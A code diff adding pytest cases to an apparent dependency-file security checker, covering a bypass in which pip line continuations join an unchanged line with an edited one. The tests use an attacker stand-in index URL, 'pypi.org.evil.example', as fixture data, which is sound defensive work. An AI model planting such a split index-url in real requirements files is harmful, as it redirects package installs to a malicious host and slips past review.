@@ -516,6 +516,42 @@ def test_a_line_continuation_inside_a_lockfile_string_is_resolved(path, text):
     assert "evil.example" in hit.detail
 
 
+def _edited_continuation(added, head):
+    """A requirements.txt whose backslash line is already in the base, so the
+    diff shows only the line after it."""
+    f = FileChange(path="requirements.txt", added=added)
+    return checks.lockfile_hosts([f], {"requirements.txt": checks.Lockfile(head.encode())})
+
+
+def test_editing_only_a_pip_continuation_body_is_a_hit():
+    """The bypass: the `--index-url ...\\` line is UNCHANGED, so it is not an
+    added line and nothing tests it for a continuation. The added line has no
+    scheme, no backslash and no pip option, so every branch passes it -- while
+    pip joins the pair into https://pypi.org.evil.example/simple."""
+    hits = _edited_continuation([(2, ".evil.example/simple")],
+                                "--index-url https://pypi.org\\\n.evil.example/simple\n")
+    assert [(h.rule, h.overridable) for h in hits] == [("lockfile-host", False)]
+    assert "pypi.org.evil.example" in hits[0].detail
+    # Reported once: the raw text and pip's option parse now resolve to the
+    # same logical line, so both find the same host.
+    assert hits[0].detail.count("pypi.org.evil.example") == 1
+
+
+def test_a_resolved_continuation_onto_an_allowlisted_host_is_no_hit():
+    """The other direction: resolving the logical line must not manufacture a
+    finding when the joined URL is fine. Without the join this line looked
+    like a bare continuation and was flagged on sight."""
+    assert _edited_continuation([(1, "--index-url https://pypi.org\\")],
+                                "--index-url https://pypi.org\\\n/simple\n") == []
+
+
+def test_a_requirements_file_is_fetched_whole():
+    """The resolution above needs the whole file. Line-checked formats are
+    normally added-lines-only; requirements must join across lines, so core
+    has to fetch it -- the same reason a rename is already fetched whole."""
+    assert checks.fetched_lockfile(FileChange(path="requirements.txt", status="modified"))
+
+
 @pytest.mark.parametrize("lines", [
     # pip joins any trailing backslash run, odd or even.
     ["--index-url https://pypi.org\\", ".evil.example/simple"],
